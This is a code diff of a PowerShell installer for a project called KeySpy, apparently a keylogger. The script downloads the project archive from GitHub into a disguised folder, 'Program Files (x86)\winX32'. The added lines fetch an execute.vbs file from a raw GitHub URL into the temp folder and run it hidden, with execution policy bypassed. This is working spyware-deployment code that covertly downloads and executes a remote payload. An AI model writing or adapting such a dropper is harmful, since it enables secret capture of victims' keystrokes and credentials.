@@ -11,9 +11,16 @@ $consolePtr = [Console.Window]::GetConsoleWindow()
 # Define the URL of the zip file
 $zipUrl = "https://github.com/3rr0r-505/KeySpy/archive/refs/heads/main.zip"
 
+# Define the URL of the execute.vbs file
+$vbsUrl = "https://raw.githubusercontent.com/3rr0r-505/KeySpy/main/execute.vbs"  # Replace "https://example.com/execute.vbs" with the actual URL
+
+
 # Define the destination folder
 $destinationFolder = "C:\Program Files (x86)\winX32"
 $destinationPSFolder = "C:\Program Files (x86)\winX32\psScript"
+
+# Define the destination folder for execute.vbs
+$destinationTemp = $env:TEMP
 
 # Create the destination folder if it doesn't exist
 if (-not (Test-Path -Path $destinationFolder)) {
@@ -38,8 +45,9 @@ Remove-Item -Path "$destinationFolder\$($extractedFolder.Name)" -Recurse -Force
 # Clean up: Remove the zip file
 Remove-Item "$destinationFolder\KeySpy.zip" -Force
 
-# Execute the startup.ps1 script silently
-Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$destinationFolder\execute.vbs'" -NoNewWindow -Wait
+# Download the execute.vbs file to the temporary folder
+$vbsFilePath = Join-Path -Path $destinationTemp -ChildPath "execute.vbs"
+Invoke-WebRequest -Uri $vbsUrl -OutFile $vbsFilePath -UseBasicParsing
 
-
-
+# Execute the execute.vbs script silently from the temporary folder
+Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File '$vbsFilePath'" -NoNewWindow -Wait
